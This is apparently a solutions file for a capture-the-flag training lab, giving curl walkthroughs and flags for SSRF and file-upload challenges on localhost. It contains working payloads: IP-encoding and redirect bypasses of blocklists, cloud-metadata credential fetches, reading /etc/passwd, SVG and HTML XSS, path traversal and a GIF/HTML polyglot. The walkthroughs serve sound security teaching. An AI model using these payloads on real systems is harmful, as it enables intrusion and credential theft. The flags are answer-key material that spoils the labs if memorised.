# Batch 04 solutions: SSRF and Upload expansion labs

Covers the 8 new SSRF labs and the 8 new Upload labs. All walkthroughs use
`http://localhost:3000` as the base URL; adjust the port if the lab runs
elsewhere. Each walkthrough was verified against a live boot with curl.

---

## ssrf – Server-Side Request Forgery

**1. Open-redirect SSRF** – `PENTRIX{ssrf_ssrf-redirect}`

`/ssrf/fetch3` follows redirects (up to 5) but only inspects the *initial*
URL's hostname against its blocklist (`127.0.0.1`). Bounce the fetch through
the open redirect at `/ssrf/jump`, whose `to` parameter goes anywhere,
including the blocked internal host:

```bash
curl --get --data-urlencode \
  "url=http://localhost:3000/ssrf/jump?to=http://127.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/fetch3
```

The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
flag `PENTRIX{ssrf_ssrf-redirect}`. The page awards the flag only when at
least one redirect was actually followed, so a direct fetch of the secret
through `/ssrf/fetch3` shows the marker but earns no flag. Fetching
`http://127.0.0.1:3000/...` directly still returns 403.

Why it works: the blocklist is checked against the first URL only and the
redirect target is never re-validated, so the 302 response from `/ssrf/jump`
smuggles the server-side request to the blocked host.

**2. Userinfo bypass** – `PENTRIX{ssrf_ssrf-userinfo}`

`/ssrf/userinfo` "allows" only URLs containing the string `pentrix.lab`.
Smuggle the trusted string in as userinfo (everything before `@` is
credentials, not the host):

```bash
curl --get --data-urlencode \
  "url=http://pentrix.lab@127.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/userinfo
```

The check sees `pentrix.lab` and passes, but the request really goes to
`127.0.0.1:3000`, returning the secret marker and the flag
`PENTRIX{ssrf_ssrf-userinfo}`.

Why it works: the allowlist is a raw substring test instead of parsing the
real hostname, so userinfo positioning tricks it while the URL parser routes
to loopback.

**3. Hex IP bypass** – `PENTRIX{ssrf_ssrf-hex-ip}`

`/ssrf/hex-ip` blocks the literal strings `127.0.0.1` and `localhost` in the
raw URL. Use hex octets, which the WHATWG URL parser normalizes to 127.0.0.1:

```bash
curl --get --data-urlencode \
  "url=http://0x7f.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/hex-ip
```

The string `0x7f.0.0.1` contains no blocked substring, yet the fetcher
connects to loopback and returns the secret marker plus the flag
`PENTRIX{ssrf_ssrf-hex-ip}`.

Why it works: the blocklist compares raw strings while the URL parser
normalizes alternate IP spellings, so the normalized request and the
blocklisted string never match.

**4. Octal IP bypass** – `PENTRIX{ssrf_ssrf-octal-ip}`

Same naive blocklist on `/ssrf/octal-ip`. Leading zeros make the parser read
octets as octal (`0177` = 127):

```bash
curl --get --data-urlencode \
  "url=http://0177.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/octal-ip
```

No blocked substring is present, the request lands on loopback, and the page
returns the secret marker with the flag `PENTRIX{ssrf_ssrf-octal-ip}`.

Why it works: the blocklist only knows dotted decimal, but the URL parser
interprets zero-padded parts as octal, resolving `0177.0.0.1` to 127.0.0.1.

**5. 0.0.0.0 bypass** – `PENTRIX{ssrf_ssrf-zero-ip}`

`/ssrf/zero-ip` never mentions `0.0.0.0` in its blocklist, and this fetcher
treats it as "this host":

```bash
curl --get --data-urlencode \
  "url=http://0.0.0.0:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/zero-ip
```

The fetch succeeds against loopback and the flag `PENTRIX{ssrf_ssrf-zero-ip}`
is awarded.

Why it works: `0.0.0.0` is a loopback-adjacent address the blocklist simply
never considered, and the fetcher rewrites it to 127.0.0.1 the way several
real HTTP stacks do.

**6. Integer IP bypass** – `PENTRIX{ssrf_ssrf-single-int}`

An IPv4 address is one 32-bit number; 127.0.0.1 = 2130706433. `/ssrf/single-int`
has the same substring blocklist:

```bash
curl --get --data-urlencode \
  "url=http://2130706433:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/single-int
```

The decimal form contains no blocked string, resolves to loopback, and the
response carries the secret marker with the flag
`PENTRIX{ssrf_ssrf-single-int}`.

Why it works: the URL parser accepts the single-integer IPv4 form and
normalizes it to 127.0.0.1, while the blocklist only recognizes the dotted
spelling.

**7. Cloud metadata SSRF** – `PENTRIX{ssrf_ssrf-metadata}`

`/ssrf/fetch-meta` simulates a cloud instance metadata service at the
link-local address 169.254.169.254, which nothing blocks:

```bash
curl --get --data-urlencode \
  "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  http://localhost:3000/ssrf/fetch-meta
```

The simulated metadata document (including fake IAM credentials whose secret
access key embeds the marker `SSRF-INTERNAL-9921`) is returned and the flag
`PENTRIX{ssrf_ssrf-metadata}` is awarded.

Why it works: the fetcher does not restrict destination addresses, so the
classic cloud metadata endpoint is reachable server-side and leaks instance
credentials.

**8. file:// scheme SSRF** – `PENTRIX{ssrf_ssrf-file}`

`/ssrf/fetch-file` accepts the `file:` scheme and reads the path with the
server's filesystem privileges:

```bash
curl --get --data-urlencode "url=file:///etc/passwd" \
  http://localhost:3000/ssrf/fetch-file
```

The page shows the contents of `/etc/passwd` (look for the `root:` line) and
awards the flag `PENTRIX{ssrf_ssrf-file}`.

Why it works: allowing `file://` in a URL fetcher turns it into a local file
reader running with the server's privileges.

---

## upload – Unrestricted File Upload

**1. Double extension bypass** – `PENTRIX{upload_upload-double-ext}`

`/upload/ext-blacklist` blocks `.svg`/`.html`/`.htm` by exact, case-sensitive
*final* extension only, while `/upload/view/:name` guesses the served content
type from a substring of the filename. Upload a file with a harmless final
extension but a dangerous middle one:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/ext-blacklist?filename=shell.svg.jpg"
```

The response contains the flag `PENTRIX{upload_upload-double-ext}`. Verify it
is served as active content:

```bash
curl -sI http://localhost:3000/upload/view/shell.svg.jpg   # Content-Type: image/svg+xml
curl -s  http://localhost:3000/upload/view/shell.svg.jpg   # payload intact
```

Why it works: `path.extname("shell.svg.jpg")` is `.jpg`, so the blacklist
misses it, but the viewer's substring check finds `.svg` and serves the file
as SVG, so embedded scripts execute in a victim's browser.

**2. Case-sensitive blacklist bypass** – `PENTRIX{upload_upload-case}`

The same v3 blacklist compares the extension exactly as written, without
lowercasing:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/ext-blacklist?filename=evil.SVG"
```

`evil.SVG` dodges the lowercase `.svg` entry and the flag
`PENTRIX{upload_upload-case}` is awarded. Fetching
`/upload/view/evil.SVG` shows it served as `image/svg+xml` with the payload
intact.

Why it works: the blacklist does a case-sensitive string comparison, but the
viewer lowercases before guessing the content type, so the uppercase variant
is stored yet still served as active SVG.

**3. Content-Type header spoofing** – `PENTRIX{upload_upload-ctype}`

`/upload/mime-check` decides "is this an image" from the client-supplied
`Content-Type` request header alone, never inspecting the bytes:

```bash
printf '<html><body><script>alert(1)</script></body></html>' \
  | curl -H "Content-Type: image/png" --data-binary @- \
    "http://localhost:3000/upload/mime-check?filename=evil.html"
```

The HTML file is accepted and the flag `PENTRIX{upload_upload-ctype}` is
awarded. `/upload/view/evil.html` returns it as `text/html`.

Why it works: the header is fully attacker-controlled, so lying about the
content type sails past a check that never looks at the actual file bytes.

**4. Path traversal on write** – `PENTRIX{upload_upload-traversal}`

`/upload/traverse` joins the raw filename to the uploads directory with no
basename or containment check. Escape the directory with `../`:

```bash
printf 'TRAVERSAL-PROOF' \
  | curl --data-binary @- "http://localhost:3000/upload/traverse?filename=../pwn.txt"
```

The file lands one level above the uploads dir and the flag
`PENTRIX{upload_upload-traversal}` is awarded. Read it back through the same
missing check on the read path:

```bash
curl "http://localhost:3000/upload/traversed?f=../pwn.txt"   # prints TRAVERSAL-PROOF
```

Why it works: `path.join` does not stop `../` segments from escaping the
intended directory, so both the write and the read resolve outside the
uploads folder.

**5. SVG onload stored XSS** – `PENTRIX{upload_upload-svg-onload}`

`/upload/svg-avatar` accepts `.svg` files and serves them inline without
stripping event-handler attributes:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="10" height="10"/></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/svg-avatar?filename=xss.svg"
```

The `onload` handler survives (the endpoint only checks for its presence) and
the flag `PENTRIX{upload_upload-svg-onload}` is awarded. Opening
`/uploads/xss.svg` directly serves it as `image/svg+xml` with the handler
intact, so the script runs in the visitor's browser.

Why it works: SVG is XML and allows event handlers on elements, the uploader
never sanitizes them, and the file is served inline as active content.

**6. Strip-once filter bypass** – `PENTRIX{upload_upload-strip-once}`

`/upload/filter` removes each dangerous extension (`.svg`, `.html`, `.htm`)
exactly once with a non-global `replace`. Nest the extension inside itself so
one removal rebuilds it:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/filter?filename=evil.s.svgvg"
```

`evil.s.svgvg` minus one occurrence of `.svg` becomes `evil.svg`; the file is
stored under that name and the flag `PENTRIX{upload_upload-strip-once}` is
awarded. `/upload/view/evil.svg` serves it as `image/svg+xml`.

Why it works: the filter runs only once, so nesting the banned string inside
itself (`.s.svgvg` -> `.svg`) reconstructs the dangerous extension after the
single strip.

**7. Avatar overwrite** – `PENTRIX{upload_upload-overwrite}`

`/upload/avatar` stores files at predictable paths (`avatar-<user>.png`) and
never checks that the uploader owns the target user. Overwrite bob's avatar:

```bash
printf 'ATTACKER-BYTES' \
  | curl --data-binary @- "http://localhost:3000/upload/avatar?user=bob"
```

Since bob's avatar bytes changed from the original, the flag
`PENTRIX{upload_upload-overwrite}` is awarded. Verify the victim URL now
serves attacker content:

```bash
curl http://localhost:3000/upload/avatar/bob   # prints ATTACKER-BYTES
```

Why it works: predictable filenames plus no ownership check let anyone write
any user's file, and the serve path even sniffs content, rendering an HTML
replacement as a page.

**8. GIF/HTML polyglot** – `PENTRIX{upload_upload-polyglot}`

`/upload/polyglot` "validates" images by checking only the first 6 magic
bytes, then `/upload/poly/:name` serves the file as `text/html`. A file can
carry a real GIF header and real HTML at once:

```bash
printf 'GIF89a<script>alert(1)</script>' \
  | curl --data-binary @- "http://localhost:3000/upload/polyglot?filename=x.gif"
```

The magic bytes pass, the scriptable HTML survives, and the flag
`PENTRIX{upload_upload-polyglot}` is awarded. Fetching
`/upload/poly/x.gif` returns `Content-Type: text/html` with
`GIF89a<script>alert(1)</script>` intact, so the browser executes it.

Why it works: magic-byte checks only validate the file's first bytes, and
serving the "validated image" as HTML executes the rest, making a true
polyglot that is both a GIF header and a script.
